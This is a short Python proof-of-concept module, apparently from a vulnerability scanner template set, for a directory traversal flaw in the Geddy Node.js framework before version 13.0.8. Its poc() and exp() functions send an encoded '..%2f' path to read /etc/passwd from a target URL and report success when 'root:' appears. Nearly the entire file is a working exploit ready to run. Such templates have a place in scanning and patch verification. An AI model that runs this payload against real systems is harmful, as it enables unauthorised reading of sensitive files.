import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Geddy before v13.0.8 LFI''',
        "description": '''Directory traversal vulnerability in lib/app/index.js in Geddy before 13.0.8 for Node.js allows remote attackers to read arbitrary files via a ..%2f (dot dot encoded slash) in the PATH_INFO to the default URI.''',
        "severity": "high",
        "references": [
            "https://nodesecurity.io/advisories/geddy-directory-traversal", 
            "https://github.com/geddy/geddy/issues/697"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2015", "geddy", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'

        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and "root:" in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url